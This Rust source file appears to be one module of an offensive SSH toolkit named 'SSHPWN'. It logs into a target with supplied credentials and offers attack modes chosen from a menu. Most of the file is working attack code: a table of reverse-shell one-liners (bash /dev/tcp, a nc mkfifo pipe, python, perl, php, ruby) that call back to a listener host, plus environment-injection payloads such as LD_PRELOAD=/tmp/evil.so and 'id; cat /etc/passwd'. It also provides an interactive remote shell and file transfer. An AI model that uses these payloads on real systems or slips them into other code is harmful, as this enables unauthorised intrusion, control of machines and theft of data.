//! SSHPWN Session Attack Module
//! 
//! Based on OpenSSH 10.0p1 vulnerability analysis
//! 
//! SESSION VULNERABILITIES (session.c):
//! - do_exec() - Forced command bypass potential
//! - do_setup_env() - Environment variable injection (HIGH)
//! - do_child() - Privilege separation boundary
//!
//! SSHD-SESSION VULNERABILITIES (sshd-session.c):
//! - privsep_preauth() - FD leakage window between fork/closefrom
//! - privsep_postauth() - Privilege retention on DISABLE_FD_PASSING platforms
//!
//! For authorized penetration testing only.

use anyhow::{anyhow, Context, Result};
use colored::*;
use crate::utils::{normalize_target, validate_command_input, validate_file_path};
use ssh2::Session;
use std::{
    collections::HashMap,
    io::{Read, Write},
    net::TcpStream,
    path::Path,
    time::Duration,
};
use tokio::io::{AsyncBufReadExt, AsyncWriteExt};

const DEFAULT_TIMEOUT_SECS: u64 = 30;

fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   SSHPWN - Session Attack Module                                  ║".cyan());
    println!("{}", "║   Based on OpenSSH session.c vulnerability analysis               ║".cyan());
    println!("{}", "║                                                                   ║".cyan());
    println!("{}", "║   Attack Modes:                                                   ║".cyan());
    println!("{}", "║   1. Environment Variable Injection (do_setup_env)                ║".cyan());
    println!("{}", "║   2. Command Execution                                            ║".cyan());
    println!("{}", "║   3. Interactive Shell                                            ║".cyan());
    println!("{}", "║   4. Reverse Shell                                                ║".cyan());
    println!("{}", "║   5. File Upload                                                  ║".cyan());
    println!("{}", "║   6. File Download                                                ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════════════╝".cyan());
    println!();
}

// Use framework's normalize_target utility - removed custom implementation

/// Create SSH session with authentication
fn create_ssh_session(
    host: &str,
    port: u16,
    username: &str,
    password: Option<&str>,
    keyfile: Option<&str>,
    timeout_secs: u64,
) -> Result<(TcpStream, Session)> {
    let addr = format!("{}:{}", host, port);
    let tcp = TcpStream::connect_timeout(
        &addr.parse().context("Invalid address")?,
        Duration::from_secs(timeout_secs),
    ).context("Connection failed")?;
    
    tcp.set_read_timeout(Some(Duration::from_secs(timeout_secs)))?;
    tcp.set_write_timeout(Some(Duration::from_secs(timeout_secs)))?;
    
    let mut sess = Session::new()?;
    sess.set_tcp_stream(tcp.try_clone()?);
    sess.handshake()?;
    
    // Authenticate
    if let Some(key) = keyfile {
        sess.userauth_pubkey_file(username, None, Path::new(key), password)?;
    } else if let Some(pass) = password {
        sess.userauth_password(username, pass)?;
    } else {
        return Err(anyhow!("No authentication method provided"));
    }
    
    if !sess.authenticated() {
        return Err(anyhow!("Authentication failed"));
    }
    
    Ok((tcp, sess))
}

/// Execute command over SSH
fn ssh_exec(sess: &Session, cmd: &str, _timeout: u64) -> Result<(i32, String, String)> {
    let mut channel = sess.channel_session()?;
    channel.exec(cmd)?;
    
    let mut stdout = String::new();
    let mut stderr = String::new();
    
    // Set non-blocking for timeout handling
    sess.set_blocking(true);
    
    channel.read_to_string(&mut stdout)?;
    channel.stderr().read_to_string(&mut stderr)?;
    
    channel.wait_close()?;
    let exit_code = channel.exit_status()?;
    
    Ok((exit_code, stdout, stderr))
}

/// Session Environment Variable Injection
/// 
/// Vulnerability: session.c do_setup_env() copies environment variables
/// from various sources including GSSAPI and client requests.
pub async fn attack_session_env_injection(
    host: &str,
    port: u16,
    username: &str,
    password: Option<&str>,
    keyfile: Option<&str>,
    custom_env: Option<HashMap<String, String>>,
) -> Result<bool> {
    println!("{}", format!("[*] Session Environment Injection on {}", host).cyan());
    
    let (_, sess) = create_ssh_session(host, port, username, password, keyfile, DEFAULT_TIMEOUT_SECS)?;
    
    println!("{}", "[*] Testing environment variable acceptance...".cyan());
    
    // Common attack vectors
    let env_injection_tests: Vec<(&str, &str)> = vec![
        ("LD_PRELOAD", "/tmp/evil.so"),
        ("LD_LIBRARY_PATH", "/tmp"),
        ("PATH", "/tmp:$PATH"),
        ("BASH_ENV", "/tmp/evil.sh"),
        ("ENV", "/tmp/evil.sh"),
        ("SSH_ORIGINAL_COMMAND", "id; cat /etc/passwd"),
        ("LC_ALL", "$(id)"),
        ("TERM", "$(id)"),
    ];
    
    let mut custom_tests: Vec<(String, String)> = Vec::new();
    if let Some(ref env_map) = custom_env {
        for (k, v) in env_map {
            custom_tests.push((k.clone(), v.clone()));
        }
    }
    
    // Check current values
    for (var, _val) in &env_injection_tests {
        let cmd = format!("echo ${}", var);
        match ssh_exec(&sess, &cmd, 10) {
            Ok((_, stdout, _)) => {
                println!("{}", format!("  {}: current='{}'", var, stdout.trim()).dimmed());
            }
            Err(_) => {}
        }
    }
    
    println!();
    println!("{}", "[*] Testing injection vectors...".cyan());
    
    // These require AcceptEnv to be configured on server
    println!("{}", "[!] AcceptEnv must allow these variables for injection to work".yellow());
    println!("{}", "[*] Check server config: grep AcceptEnv /etc/ssh/sshd_config".dimmed());
    
    // Test common permitted env vars
    let permitted_test = "env | grep -E '^(LANG|LC_|SSH_)' | head -10";
    match ssh_exec(&sess, permitted_test, 10) {
        Ok((_, stdout, _)) => {
            if !stdout.is_empty() {
                println!("{}", "[+] Accepted environment variables:".green());
                println!("{}", stdout);
            }
        }
        Err(_) => {}
    }
    
    // Test if we can see SSH_ORIGINAL_COMMAND
    let cmd = "echo SSH_ORIGINAL_COMMAND=$SSH_ORIGINAL_COMMAND";
    match ssh_exec(&sess, cmd, 10) {
        Ok((_, stdout, _)) => {
            println!("{}", format!("[*] SSH_ORIGINAL_COMMAND test: {}", stdout.trim()).cyan());
        }
        Err(_) => {}
    }
    
    Ok(true)
}

/// Execute command on target
pub async fn attack_exec(
    host: &str,
    port: u16,
    username: &str,
    password: Option<&str>,
    keyfile: Option<&str>,
    command: &str,
    timeout: u64,
) -> Result<bool> {
    let (_, sess) = create_ssh_session(host, port, username, password, keyfile, DEFAULT_TIMEOUT_SECS)?;
    
    println!("{}", format!("[+] Authenticated to {} as {}", host, username).green());
    
    match ssh_exec(&sess, command, timeout) {
        Ok((code, stdout, stderr)) => {
            println!();
            println!("{}", format!("[{}] Exit: {}", host, code).cyan());
            if !stdout.is_empty() {
                println!("{}", stdout);
            }
            if !stderr.is_empty() {
                println!("{}", stderr.red());
            }
            Ok(code == 0)
        }
        Err(e) => {
            println!("{}", format!("[-] Command execution failed: {}", e).red());
            // Explicit session cleanup on error
            drop(sess);
            Ok(false)
        }
    }
}

/// Reverse shell payloads
fn get_reverse_shell_payloads() -> HashMap<&'static str, &'static str> {
    let mut payloads = HashMap::new();
    payloads.insert("bash", "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1");
    payloads.insert("bash_alt", "/bin/bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"");
    payloads.insert("nc", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f");
    payloads.insert("python", "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'");
    payloads.insert("python3", "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'");
    payloads.insert("perl", "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'");
    payloads.insert("php", "php -r '$s=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'");
    payloads.insert("ruby", "ruby -rsocket -e's=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",s,s,s)'");
    payloads
}

/// Send reverse shell payload
pub async fn attack_revshell(
    host: &str,
    port: u16,
    username: &str,
    password: Option<&str>,
    keyfile: Option<&str>,
    lhost: &str,
    lport: u16,
    payload_type: &str,
) -> Result<bool> {
    let payloads = get_reverse_shell_payloads();
    
    let payload_template = payloads.get(payload_type)
        .ok_or_else(|| anyhow!("Unknown payload type: {}. Available: {}", payload_type, 
            payloads.keys().cloned().collect::<Vec<_>>().join(", ")))?;
    
    let cmd = payload_template
        .replace("{lhost}", lhost)
        .replace("{lport}", &lport.to_string());
    
    println!("{}", format!("[*] Payload ({}): ", payload_type).cyan());
    println!("  {}", cmd);
    println!();
    println!("{}", format!("[!] Start listener: nc -lvnp {}", lport).yellow().bold());
    println!();
    
    print!("Press Enter to send payload...");
    tokio::io::stdout()
        .flush()
        .await
        .context("Failed to flush stdout")?;
    let mut input = String::new();
    tokio::io::BufReader::new(tokio::io::stdin())
        .read_line(&mut input)
        .await
        .context("Failed to read input")?;
    
    attack_exec(host, port, username, password, keyfile, &cmd, 5).await
}

/// Upload file via SFTP
pub async fn attack_upload(
    host: &str,
    port: u16,
    username: &str,
    password: Option<&str>,
    keyfile: Option<&str>,
    local_path: &str,
    remote_path: &str,
) -> Result<bool> {
    let (_, sess) = create_ssh_session(host, port, username, password, keyfile, DEFAULT_TIMEOUT_SECS)?;
    
    let sftp = sess.sftp().context("SFTP initialization failed")?;
    
    // Read local file
    let content = std::fs::read(local_path)
        .context(format!("Failed to read local file: {}", local_path))?;
    
    // Write to remote
    let mut remote_file = sftp.create(Path::new(remote_path))?;
    remote_file.write_all(&content)?;
    
    println!("{}", format!("[+] Uploaded {} -> {}", local_path, remote_path).green());
    
    Ok(true)
}

/// Download file via SFTP
pub async fn attack_download(
    host: &str,
    port: u16,
    username: &str,
    password: Option<&str>,
    keyfile: Option<&str>,
    remote_path: &str,
    local_path: &str,
) -> Result<bool> {
    let (_, sess) = create_ssh_session(host, port, username, password, keyfile, DEFAULT_TIMEOUT_SECS)?;
    
    let sftp = sess.sftp().context("SFTP initialization failed")?;
    
    // Read from remote
    let mut remote_file = sftp.open(Path::new(remote_path))?;
    let mut content = Vec::new();
    remote_file.read_to_end(&mut content)?;
    
    // Write to local
    std::fs::write(local_path, &content)
        .context(format!("Failed to write local file: {}", local_path))?;
    
    println!("{}", format!("[+] Downloaded {} -> {}", remote_path, local_path).green());
    
    Ok(true)
}

/// Interactive shell - continuous command execution loop
pub async fn attack_interactive_shell(
    host: &str,
    port: u16,
    username: &str,
    password: Option<&str>,
    keyfile: Option<&str>,
) -> Result<bool> {
    let (_, sess) = create_ssh_session(host, port, username, password, keyfile, DEFAULT_TIMEOUT_SECS)?;
    
    println!("{}", format!("[PWNED] Interactive shell on {}:{}", host, port).red().bold());
    println!("{}", "[*] Type 'exit' or 'quit' to disconnect".cyan());
    println!("{}", "[*] Type '!upload <local> <remote>' to upload files".cyan());
    println!("{}", "[*] Type '!download <remote> <local>' to download files".cyan());
    println!();
    
    // Get initial info
    if let Ok((_, whoami, _)) = ssh_exec(&sess, "whoami", 5) {
        if let Ok((_, hostname, _)) = ssh_exec(&sess, "hostname", 5) {
            println!("{}", format!("[*] Logged in as: {}@{}", whoami.trim(), hostname.trim()).green());
        }
    }
    
    // Get initial working directory
    let mut cwd = String::from("~");
    if let Ok((_, pwd, _)) = ssh_exec(&sess, "pwd", 5) {
        cwd = pwd.trim().to_string();
    }
    
    let mut stdin_reader = tokio::io::BufReader::new(tokio::io::stdin());
    loop {
        // Print prompt
        print!("{}", format!("{}@{}:{} $ ", username, host, cwd).green());
        tokio::io::stdout()
            .flush()
            .await
            .context("Failed to flush stdout")?;
        
        // Read command
        let mut input = String::new();
        if stdin_reader.read_line(&mut input).await.is_err() {
            break;
        }
        
        let cmd = input.trim();
        
        if cmd.is_empty() {
            continue;
        }
        
        // Handle special commands
        if cmd == "exit" || cmd == "quit" {
            println!("{}", "[*] Disconnecting...".cyan());
            break;
        }
        
        // Handle file upload
        if cmd.starts_with("!upload ") {
            let parts: Vec<&str> = cmd.splitn(3, ' ').collect();
            if parts.len() == 3 {
                let local_path = parts[1];
                let remote_path = parts[2];
                match sess.sftp() {
                    Ok(sftp) => {
                        match std::fs::read(local_path) {
                            Ok(content) => {
                                match sftp.create(std::path::Path::new(remote_path)) {
                                    Ok(mut f) => {
                                        if f.write_all(&content).is_ok() {
                                            println!("{}", format!("[+] Uploaded {} -> {}", local_path, remote_path).green());
                                        } else {
                                            println!("{}", "[-] Write failed".red());
                                        }
                                    }
                                    Err(e) => println!("{}", format!("[-] Create failed: {}", e).red()),
                                }
                            }
                            Err(e) => println!("{}", format!("[-] Read local file failed: {}", e).red()),
                        }
                    }
                    Err(e) => println!("{}", format!("[-] SFTP failed: {}", e).red()),
                }
            } else {
                println!("{}", "Usage: !upload <local_path> <remote_path>".yellow());
            }
            continue;
        }
        
        // Handle file download
        if cmd.starts_with("!download ") {
            let parts: Vec<&str> = cmd.splitn(3, ' ').collect();
            if parts.len() == 3 {
                let remote_path = parts[1];
                let local_path = parts[2];
                match sess.sftp() {
                    Ok(sftp) => {
                        match sftp.open(std::path::Path::new(remote_path)) {
                            Ok(mut f) => {
                                let mut content = Vec::new();
                                if f.read_to_end(&mut content).is_ok() {
                                    if std::fs::write(local_path, &content).is_ok() {
                                        println!("{}", format!("[+] Downloaded {} -> {}", remote_path, local_path).green());
                                    } else {
                                        println!("{}", "[-] Write local file failed".red());
                                    }
                                } else {
                                    println!("{}", "[-] Read remote file failed".red());
                                }
                            }
                            Err(e) => println!("{}", format!("[-] Open failed: {}", e).red()),
                        }
                    }
                    Err(e) => println!("{}", format!("[-] SFTP failed: {}", e).red()),
                }
            } else {
                println!("{}", "Usage: !download <remote_path> <local_path>".yellow());
            }
            continue;
        }
        
        // Handle cd command specially to track cwd
        if cmd.starts_with("cd ") || cmd == "cd" {
            let new_dir = if cmd == "cd" { "~" } else { &cmd[3..] };
            let check_cmd = format!("cd {} && pwd", new_dir);
            match ssh_exec(&sess, &check_cmd, 10) {
                Ok((code, stdout, _)) => {
                    if code == 0 {
                        cwd = stdout.trim().to_string();
                    } else {
                        println!("{}", format!("cd: {}: No such directory", new_dir).red());
                    }
                }
                Err(e) => println!("{}", format!("[-] Error: {}", e).red()),
            }
            continue;
        }
        
        // Validate command input to prevent injection
        let validated_cmd = validate_command_input(&cmd)
            .map_err(|e| anyhow!("Invalid command: {}", e))?;
        
        // Execute regular command (prepend cd to maintain directory context)
        let full_cmd = format!("cd {} && {}", cwd, validated_cmd);
        match ssh_exec(&sess, &full_cmd, 60) {
            Ok((code, stdout, stderr)) => {
                if !stdout.is_empty() {
                    print!("{}", stdout);
                }
                if !stderr.is_empty() {
                    print!("{}", stderr.red());
                }
                if code != 0 && stdout.is_empty() && stderr.is_empty() {
                    println!("{}", format!("Command exited with code: {}", code).yellow());
                }
            }
            Err(e) => println!("{}", format!("[-] Error: {}", e).red()),
        }
    }
    
    // Explicit session cleanup
    drop(sess);
    
    println!("{}", "[*] Session closed".cyan());
    Ok(true)
}

/// Prompt helper
async fn prompt(message: &str) -> Result<String> {
    print!("{}: ", message);
    tokio::io::stdout()
        .flush()
        .await
        .context("Failed to flush stdout")?;
    let mut input = String::new();
    tokio::io::BufReader::new(tokio::io::stdin())
        .read_line(&mut input)
        .await
        .context("Failed to read input")?;
    Ok(input.trim().to_string())
}

async fn prompt_default(message: &str, default: &str) -> Result<String> {
    print!("{} [{}]: ", message, default);
    tokio::io::stdout()
        .flush()
        .await
        .context("Failed to flush stdout")?;
    let mut input = String::new();
    tokio::io::BufReader::new(tokio::io::stdin())
        .read_line(&mut input)
        .await
        .context("Failed to read input")?;
    let trimmed = input.trim();
    if trimmed.is_empty() {
        Ok(default.to_string())
    } else {
        Ok(trimmed.to_string())
    }
}

async fn prompt_optional(message: &str) -> Result<Option<String>> {
    print!("{} (leave empty to skip): ", message);
    tokio::io::stdout()
        .flush()
        .await
        .context("Failed to flush stdout")?;
    let mut input = String::new();
    tokio::io::BufReader::new(tokio::io::stdin())
        .read_line(&mut input)
        .await
        .context("Failed to read input")?;
    let trimmed = input.trim();
    if trimmed.is_empty() {
        Ok(None)
    } else {
        Ok(Some(trimmed.to_string()))
    }
}

/// Main entry point
pub async fn run(target: &str) -> Result<()> {
    display_banner();
    
    let host = normalize_target(target)?;
    println!("{}", format!("[*] Target: {}", host).cyan());
    
    // Get connection parameters
    let port: u16 = prompt_default("SSH Port", "22").await?.parse().unwrap_or(22);
    let username = prompt("Username").await?;
    if username.is_empty() {
        return Err(anyhow!("Username is required"));
    }
    
    let password = prompt_optional("Password").await?;
    let keyfile = prompt_optional("SSH Key File Path").await?;
    
    // Validate keyfile path if provided
    if let Some(ref kf) = keyfile {
        validate_file_path(kf, true)
            .map_err(|e| anyhow!("Invalid keyfile path: {}", e))?;
    }
    
    if password.is_none() && keyfile.is_none() {
        return Err(anyhow!("Either password or keyfile is required"));
    }
    
    println!();
    println!("{}", "Select attack mode:".yellow().bold());
    println!("  1. Environment Variable Injection Test");
    println!("  2. Execute Command");
    println!("  3. Interactive Shell");
    println!("  4. Reverse Shell");
    println!("  5. Upload File");
    println!("  6. Download File");
    println!();
    
    let mode = prompt_default("Attack mode", "1").await?;
    
    let password_ref = password.as_deref();
    let keyfile_ref = keyfile.as_deref();
    
    match mode.as_str() {
        "1" => {
            attack_session_env_injection(&host, port, &username, password_ref, keyfile_ref, None).await?;
        }
        "2" => {
            let command = prompt_default("Command to execute", "id").await?;
            let validated_command = validate_command_input(&command)
                .map_err(|e| anyhow!("Invalid command: {}", e))?;
            attack_exec(&host, port, &username, password_ref, keyfile_ref, &validated_command, 30).await?;
        }
        "3" => {
            attack_interactive_shell(&host, port, &username, password_ref, keyfile_ref).await?;
        }
        "4" => {
            let lhost = prompt("Listener IP (LHOST)").await?;
            if lhost.is_empty() {
                return Err(anyhow!("LHOST is required"));
            }
            let lport: u16 = prompt_default("Listener Port (LPORT)", "4444").await?.parse().unwrap_or(4444);
            
            println!();
            println!("{}", "Available payloads:".cyan());
            let payloads = get_reverse_shell_payloads();
            for key in payloads.keys() {
                println!("  - {}", key);
            }
            let payload_type = prompt_default("Payload type", "bash").await?;
            
            attack_revshell(&host, port, &username, password_ref, keyfile_ref, &lhost, lport, &payload_type).await?;
        }
        "5" => {
            let local_path = prompt("Local file path").await?;
            let remote_path = prompt("Remote file path").await?;
            let validated_local = validate_file_path(&local_path, true)
                .map_err(|e| anyhow!("Invalid local file path: {}", e))?;
            let validated_remote = validate_file_path(&remote_path, true)
                .map_err(|e| anyhow!("Invalid remote file path: {}", e))?;
            attack_upload(&host, port, &username, password_ref, keyfile_ref, &validated_local, &validated_remote).await?;
        }
        "6" => {
            let remote_path = prompt("Remote file path").await?;
            let local_path = prompt("Local file path").await?;
            let validated_remote = validate_file_path(&remote_path, true)
                .map_err(|e| anyhow!("Invalid remote file path: {}", e))?;
            let validated_local = validate_file_path(&local_path, true)
                .map_err(|e| anyhow!("Invalid local file path: {}", e))?;
            attack_download(&host, port, &username, password_ref, keyfile_ref, &validated_remote, &validated_local).await?;
        }
        _ => {
            println!("{}", "[-] Invalid mode".red());
        }
    }
    
    println!();
    println!("{}", "[*] Session attack module complete".green());
    
    Ok(())
}

